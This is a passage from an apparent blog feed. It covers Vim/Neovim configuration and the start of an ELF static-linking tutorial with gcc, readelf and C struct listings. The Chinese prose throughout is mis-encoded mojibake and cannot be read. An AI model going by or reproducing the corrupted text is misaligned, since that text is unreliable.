argtextobj</span><br><span class="line"><span class="built_in">set</span> hlsearch</span><br><span class="line"><span class="built_in">set</span> smartcase</span><br><span class="line"><span class="built_in">set</span> scrolloff=<span class="number">5</span></span><br><span class="line"><span class="built_in">set</span> cursorline</span><br><span class="line"><span class="built_in">set</span> expandtab</span><br><span class="line"><span class="built_in">set</span> cindent</span><br><span class="line"><span class="built_in">set</span> autoindento</span><br><span class="line">let mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line">Plug <span class="string">&#x27;preservim/nerdtree&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;vim-easymotion&#x27;</span></span><br><span class="line"><span class="built_in">map</span> &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span><br><span class="line"><span class="built_in">set</span> clipboard+=unnamed</span><br><span class="line"><span class="built_in">set</span> incsearch</span><br><span class="line"><span class="built_in">map</span> &lt;Leader&gt; &lt;Plug&gt;(easymotion-prefix)</span><br><span class="line"><span class="built_in">map</span> &lt;leader&gt;rn &lt;Action&gt;(RenameElement)</span><br><span class="line"><span class="built_in">map</span> gp &lt;Action&gt;(ParameterInfo)  </span><br><span class="line"><span class="built_in">map</span> gh &lt;Action&gt;(ShowErrorDescription)</span><br><span class="line"><span class="built_in">map</span> gi &lt;Action&gt;(QuickImplementations)</span><br><span class="line"><span class="built_in">map</span> gm &lt;Action&gt;(QuickJavaDoc)</span><br><span class="line"><span class="built_in">set</span> noerrorbells</span><br><span class="line"><span class="built_in">set</span> visualbell</span><br><span class="line"><span class="built_in">set</span> showmode</span><br><span class="line">nnoremap &lt;s-k&gt; gt</span><br><span class="line">nnoremap &lt;s-J&gt; gT</span><br><span class="line">nnoremap &lt;S-q&gt; :q!&lt;CR&gt;</span><br><span class="line">nnoremap == :&lt;C-u&gt;action ReformatCode&lt;CR&gt;</span><br></pre></td></tr></table></figure><h2 id="vimâ€“-gt-neovim"><a href="#vimâ€“-gt-neovim" class="headerlink" title="vimâ€“&gt;neovim"></a>vimâ€“&gt;neovim</h2><p>9.0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo snap install nvim  --classic</span><br></pre></td></tr></table></figure><p><a href="https://neovim.io/doc/user/nvim.html#nvim-from-vim">https://neovim.io/doc/user/nvim.html#nvim-from-vim</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install neovim</span><br><span class="line">mkdir -p ~/.config/nvim/</span><br><span class="line">touch init.vim    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nvim init.vim</span><br><span class="line">:exe <span class="string">&#x27;edit &#x27;</span>.stdpath(<span class="string">&#x27;config&#x27;</span>)<span class="number">.&#x27;</span>/init.vim<span class="number">&#x27;</span></span><br><span class="line">:write ++p</span><br></pre></td></tr></table></figure><p>å¤åˆ¶åˆ°init.vim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> runtimepath^=~/.vim runtimepath+=~/.vim/after</span><br><span class="line">let &amp;packpath = &amp;runtimepath</span><br><span class="line">source ~/.vimrc</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd ~/.local/share/nvim</span><br><span class="line">ln -s ~/.vim/plugged/ ./plugged</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸ªç¬¦å·é“¾æ¥viå¯åŠ¨nvim</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">sudo rm vi</span><br><span class="line">sudo ln -s nvim vi</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELFé™æ€é“¾æ¥(ELF Static link)</title>
      <link href="/2023/04/28/static-link/"/>
      <url>/2023/04/28/static-link/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-Static-link"><a href="#ELF-Static-link" class="headerlink" title="ELF Static link"></a>ELF Static link</h1><p><img src="/2023/04/28/static-link/image-20230428222115232.png" alt="image-20230428222115232"></p><p>ä¹‹å‰åœ¨elfæ–‡ä»¶è§£ææ—¶åªæ˜¯åšäº†ä¸€ä¸‹å¯æ‰§è¡Œæ–‡ä»¶elfä»æ‰§è¡Œçš„è§†è§’çœ‹äº†å¦‚ä½•ä¾é Program Header tableåŠ è½½åˆ°å†…å­˜åŒºæ‰§è¡Œçš„è¿‡ç¨‹ï¼Œè¿™æ¬¡è¡¥ä¸ªä»é“¾æ¥çš„è§†è§’çœ‹å¯é‡å®šä½elfæ–‡ä»¶å¦‚ä½•ä¾é Section Header tableåšé™æ€é“¾æ¥æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„</p><p>?????????????????????????????????????????ä¸‘å°é¸­å˜å¤©é¹…????????????????????????????????????</p><p>Program Header tableå…¶å®å°±æ˜¯æŠŠä¸€äº›sectionçœ‹æˆä¸€å—</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -l xxx.so</span><br><span class="line"></span><br><span class="line">Elf file type is <span class="title function_">DYN</span> <span class="params">(Shared object file)</span></span><br><span class="line">Entry point 0x420</span><br><span class="line">There are 7 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  LOAD           0x000000 0x00000000 0x00000000 0x00678 0x00678 R E 0x1000</span><br><span class="line">  LOAD           0x000efc 0x00001efc 0x00001efc 0x0011c 0x00124 RW  0x1000</span><br><span class="line">  DYNAMIC        0x000f08 0x00001f08 0x00001f08 0x000e0 0x000e0 RW  0x4</span><br><span class="line">  NOTE           0x000114 0x00000114 0x00000114 0x00024 0x00024 R   0x4</span><br><span class="line">  GNU_EH_FRAME   0x0005b4 0x000005b4 0x000005b4 0x0002c 0x0002c R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x000efc 0x00001efc 0x00001efc 0x00104 0x00104 R   0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00     .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rel.dyn .rel.plt .init .plt .plt.got .text .fini .eh_frame_hdr .eh_frame</span><br><span class="line">   01     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss</span><br><span class="line">   02     .dynamic</span><br><span class="line">   03     .note.gnu.build-id</span><br><span class="line">   04     .eh_frame_hdr</span><br><span class="line">   05</span><br><span class="line">   06     .init_array .fini_array .jcr .dynamic .got</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹çš„åªæœ‰å‰é¢ä¸¤ä¸ªlOADç±»å‹å—æ˜¯è¢«åŠ è½½çš„åˆ°å†…å­˜ï¼Œå…¶ä½™éƒ½æ˜¯è¾…åŠ©ä¿¡æ¯ï¼Œé€šè¿‡ä¸‹é¢çš„ Section to Segment mappingå¯ä»¥çœ‹å‡ºæ˜¯æŠŠå¤šä¸ªsectionå½“æˆä¸€å—åŠ è½½åˆ°å†…å­˜</p><blockquote><p>è¿™æ ·åšåº”è¯¥æ˜¯ä¸ºäº†å‡å°‘ä¸€äº›ç©ºé—´ç¢ç‰‡,å› ä¸ºæ˜ å°„æ˜¯æŒ‰ç…§é¡µå¤§å°æ¥çš„ã€‚æœ‰å¤ªå¤šçš„sectionä¸è¶³ä¸€ä¸ªé¡µå¤§å°ï¼Œä¼šæµªè´¹ç©ºé—´ï¼Œä½†æ˜¯æˆ‘ä»¬æ“ä½œç³»ç»Ÿåªå…³å¿ƒsectionæƒé™ï¼Œæ‰€ä»¥æŠŠç›¸åŒæƒé™çš„sectionå½“æˆä¸€ä¸ªæ•´ä½“å»æ˜ å°„</p></blockquote><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609</span><br><span class="line">Copyright (C) 2015 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>ä¸­é—´ä¼šç©¿æ’ä¸€ç‚¹11.3.0ç‰ˆæœ¬ just a little bit</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/nemu [SIGINT]&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>å·¥å…·ä¸»è¦æ˜¯GNU Binutils  <a href="https://www.gnu.org/software/binutils/">https://www.gnu.org/software/binutils/</a> </p><p>ä»¥32ä½ç¨‹åºä¸ºä¾‹</p><h2 id="ç¼–è¯‘æ¼«è°ˆ"><a href="#ç¼–è¯‘æ¼«è°ˆ" class="headerlink" title="ç¼–è¯‘æ¼«è°ˆ"></a>ç¼–è¯‘æ¼«è°ˆ</h2><p>ä»å¤è€çš„ä¼ è¯´hello worldè¯´èµ·ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆšå¼€å§‹å¤§éƒ¨åˆ†äººåˆå­¦æ—¶åŸºæœ¬ä¸Šéƒ½æ˜¯ç›´æ¥é›†æˆç¯å¢ƒçš„ideä¸€é”®ç¼–è¯‘è¿è¡Œï¼Œæ…¢æ…¢å¼€å§‹ç”¨ä¸€äº›ç¼–è¯‘å·¥å…·ï¼Œgcc,makeç­‰ï¼Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc test2.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; ./a.out</span><br><span class="line">hello worldâ</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯gccå¸®æˆ‘ä»¬åšçš„è¿œæ¯”æˆ‘ä»¬æƒ³è±¡çš„å¤šçš„å¤š</p><p>gccæä¾›ç»™äº†æˆ‘ä»¬ä¸€ä¸ªé€‰é¡¹æ¥çœ‹æ˜¾ç¤ºç¼–è¯‘å’Œé“¾æ¥å…·ä½“è¿‡ç¨‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">verbose</span><br><span class="line">    Enable showing the tree dump <span class="keyword">for</span> each statement.</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --verbose test2.c</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper</span><br><span class="line">Target: x86_64-linux-gnu</span><br><span class="line">Configured with: ../src/configure -v --with-pkgversion=<span class="string">&#x27;Ubuntu 5.4.0-6ubuntu1~16.04.12&#x27;</span> --with-bugurl=file:<span class="comment">///usr/share/doc/gcc-5/README.Bugs --enable-languages=c,ada,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-5 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-5-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-5-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-5-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</span></span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>)</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br><span class="line">GNU C11 (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/local/include/x86_64-linux-gnu&quot;</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;...&quot;</span> search starts here:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;...&gt;</span> search starts here:</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search <span class="built_in">list</span>.</span><br><span class="line">GNU C11 (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">Compiler executable checksum: <span class="number">8087146</span>d2ee737d238113fb57fabb1f2</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> as -v -<span class="number">-64</span> -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br><span class="line">GNU assembler version <span class="number">2.26</span><span class="number">.1</span> (x86_64-linux-gnu) using BFD version (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.26</span><span class="number">.1</span></span><br><span class="line">COMPILER_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/</span><br><span class="line">LIBRARY_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../../lib/:/lib/x86_64-linux-gnu/:/lib/../lib/:/usr/lib/x86_64-linux-gnu/:/usr/lib/../lib/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../:/lib/:/usr/lib/</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/collect2 -plugin /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/liblto_plugin.so -plugin-opt=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper -plugin-opt=-fresolution=/tmp/ccvOb2eL.res -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s -plugin-opt=-pass-through=-lc -plugin-opt=-pass-through=-lgcc -plugin-opt=-pass-through=-lgcc_s --sysroot=/ --build-id --eh-frame-hdr -m elf_x86_64 --hash-style=gnu --as-needed -dynamic-linker /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> -z relro /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crt1.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crti.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtbegin.o -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span> -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../../lib -L/lib/x86_64-linux-gnu -L/lib/../lib -L/usr/lib/x86_64-linux-gnu -L/usr/lib/../lib -L/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../.. /tmp/ccyxTcBb.o -lgcc --as-needed -lgcc_s --no-as-needed -lc -lgcc --as-needed -lgcc_s --no-as-needed /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/crtend.o /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/crtn.o</span><br></pre></td></tr></table></figure><p>tmdï¼Œè¿™åˆç†å—? å“ˆï¼Œè¿™å¾ˆåˆç†!</p><p>å°è¯•ç€å»çœ‹ä¸€ä¸‹ï¼Œä¼šå‘ç°ä¸€äº›æˆ‘ä»¬åŸæœ¬ç†Ÿæ‚‰çš„ä¸œè¥¿</p><p>åˆšå¼€å§‹è¾“å‡ºäº†ä¸€äº›æˆ‘ä»¬gccçš„ç‰ˆæœ¬ä¿¡æ¯ç­‰</p><p>ç†Ÿæ‚‰çš„cc1å»åšé¢„å¤„ç†å¹¶å¯¹é¢„å¤„ç†è¿‡çš„æ–‡ä»¶åšç¼–è¯‘(ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰çœ‹è§cppå»åšé¢„å¤„ç†çš„èº«å½±)ï¼Œè¿™ä¸€æ­¥æ˜¯æœ¬èº«å°±æå…¶å¤æ‚çš„ï¼Œè¯­æ³•æ ‘ä»€ä¹ˆçš„ï¼Œæ›´åˆ«æä»£ç ä¼˜åŒ–ç­‰ç­‰ï¼Œå…·ä½“çš„ä¸œè¥¿å¯èƒ½è¦å»è¡¥è¡¥ç¼–è¯‘åŸç† ps:è¿™å­¦æœŸç»™è‡ªå·±æŒ–çš„å‘å¤Ÿå¤šäº†ï¼Œåªèƒ½ä¸‹æ¬¡ä¸€å®š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p>æ‰“å°å‡ºä»–æœç´¢å¤´æ–‡ä»¶çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ignoring nonexistent directory &quot;/usr/local/include/x86_64-linux-gnu&quot;</span><br><span class="line">ignoring nonexistent directory &quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span><br><span class="line">#include &quot;...&quot; search starts here:</span><br><span class="line">#include &lt;...&gt; search starts here:</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/5/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search list.</span><br></pre></td></tr></table></figure><p>as æ±‡ç¼–å™¨å»åšæ±‡ç¼–ï¼Œå°±æ˜¯æœºæ¢°çš„ç¿»è¯‘æ±‡ç¼–åˆ°æœºå™¨ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">as -v --64 -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br></pre></td></tr></table></figure><p>åé¢ä»<code> /usr/lib/gcc/x86_64-linux-gnu/5/collect2</code>åˆ°æœ€å<code>/x86_64-linux-gnu/crtn.o</code>éƒ½æ˜¯åœ¨ç”¨collect2åšé“¾æ¥ collect2æ˜¯ldé“¾æ¥å™¨çš„ä¸€ä¸ªå°è£…</p><p>æˆ‘ä»¬è¦è¿™æ¬¡è¦ç ”ç©¶çš„å°±æ˜¯ldç©¶ç«Ÿæ€ä¹ˆåšçš„é“¾æ¥ï¼Œæ€ä¹ˆæŠŠå¤šä¸ªå¯èƒ½äº’ç›¸å¼•ç”¨çš„å¯é‡å®šä½æ–‡ä»¶é“¾æ¥æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„</p><h2 id="é‡ç”Ÿä¹‹æˆ‘æ˜¯linker"><a href="#é‡ç”Ÿä¹‹æˆ‘æ˜¯linker" class="headerlink" title="é‡ç”Ÿä¹‹æˆ‘æ˜¯linker"></a>é‡ç”Ÿä¹‹æˆ‘æ˜¯linker</h2><p>æŠŠè‡ªå·±æƒ³è±¡æˆlinkerï¼Œæˆ‘ä»¬æœ‰çš„æ˜¯å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œæˆ‘ä»¬è¦æŠŠä»–å˜ä¸ºå¯æ‰§è¡Œæ–‡ä»¶,é¦–å…ˆè¦å¯¹æœ‰ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆçš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åšä¸ªäº†è§£ï¼Œç¼–è¯‘å™¨ç»™äº†ä»–ä»€ä¹ˆï¼Œå¦‚æœä»€ä¹ˆéƒ½æ²¡æœ‰æˆ‘ä»¬linkerå‡­ä»€ä¹ˆæˆ–è€…è¯´ä½•å¾·ä½•èƒ½æŠŠä»–å˜ä¸ºå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</p><p>linker: ?ä»€ä¹ˆéƒ½æ²¡æœ‰?ä¸å¥½æ„æ€æˆ‘åšä¸åˆ°!</p><h3 id="Relocatable-object-file"><a href="#Relocatable-object-file" class="headerlink" title="Relocatable object file"></a>Relocatable object file</h3><p>ELFé‡Œçš„ä¸€äº›å®šä¹‰ç¬¦å·</p><pre><code>The following types are used for  N-bit  architectures  (N=32,64,  ElfNstands for Elf32 or Elf64, uintN_t stands for uint32_t or uint64_t):ElfN_Addr       Unsigned program address, uintN_tElfN_Off        Unsigned file offset, uintN_tElfN_Section    Unsigned section index, uint16_tElfN_Versym     Unsigned version symbol information, uint16_tElf_Byte        unsigned charElfN_Half       uint16_tElfN_Sword      int32_tElfN_Word       uint32_tElfN_Sxword     int64_tElfN_Xword      uint64_t</code></pre><p> simple_section.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> global_static_var;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> reference_to_out;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line"></span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc -m32 -c simple_section.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; file simple_section.o</span><br><span class="line">simple_section.o: ELF <span class="number">32</span>-bit LSB relocatable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), not stripped</span><br></pre></td></tr></table></figure><p>ELFæ–‡ä»¶ï¼Œé“¾æ¥æˆ‘ä»¬ä¾é çš„æ˜¯ä»–çš„section head table ï¼Œlinkerå“ªé‡Œæ‰¾åˆ°ä»–å‘¢?</p><p>ELF headeré‡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> EI_NIDENT   16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>   e_ident[EI_NIDENT]; <span class="comment">/* ELFæ–‡ä»¶æ ‡è¯† */</span></span><br><span class="line">    Elf32_Half      e_type;             <span class="comment">/* æ–‡ä»¶ç±»å‹ */</span></span><br><span class="line">    Elf32_Half      e_machine;          <span class="comment">/* æœºå™¨ç±»å‹ */</span></span><br><span class="line">    Elf32_Word      e_version;          <span class="comment">/* æ–‡ä»¶ç‰ˆæœ¬ */</span></span><br><span class="line">    Elf32_Addr      e_entry;            <span class="comment">/* ç¨‹åºå…¥å£åœ°å€ */</span></span><br><span class="line">    Elf32_Off       e_phoff;            <span class="comment">/* ç¨‹åºå¤´è¡¨åç§» */</span></span><br><span class="line">    Elf32_Off       e_shoff;            <span class="comment">/* èŠ‚å¤´è¡¨åç§» */</span></span><br><span class="line">    Elf32_Word      e_flags;            <span class="comment">/* æ–‡ä»¶æ ‡å¿— */</span></span><br><span class="line">    Elf32_Half      e_ehsize;           <span class="comment">/* ELFå¤´å¤§å° */</span></span><br><span class="line">    Elf32_Half      e_phentsize;        <span class="comment">/* ç¨‹åºå¤´è¡¨é¡¹å¤§å° */</span></span><br><span class="line">    Elf32_Half      e_phnum;            <span class="comment">/* ç¨‹åºå¤´è¡¨é¡¹æ•°é‡ */</span></span><br><span class="line">    Elf32_Half      e_shentsize;        <span class="comment">/* èŠ‚å¤´è¡¨é¡¹å¤§å° */</span></span><br><span class="line">    Elf32_Half      e_shnum;            <span class="comment">/* èŠ‚å¤´è¡¨é¡¹æ•°é‡ */</span></span><br><span class="line">    Elf32_Half      e_shstrndx;         <span class="comment">/* èŠ‚å¤´è¡¨å­—ç¬¦ä¸²è¡¨ç´¢å¼• */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p><code>e_shoff</code>(section header table offset)ç»™å‡ºäº†åœ¨æ–‡ä»¶é‡Œçš„åç§»ï¼Œe_shnumï¼Œe_shentsizeèŠ‚å¤´è¡¨é¡¹å¤§å°å’Œæ•°é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; readelf -h simple_section.o</span><br><span class="line">ELF 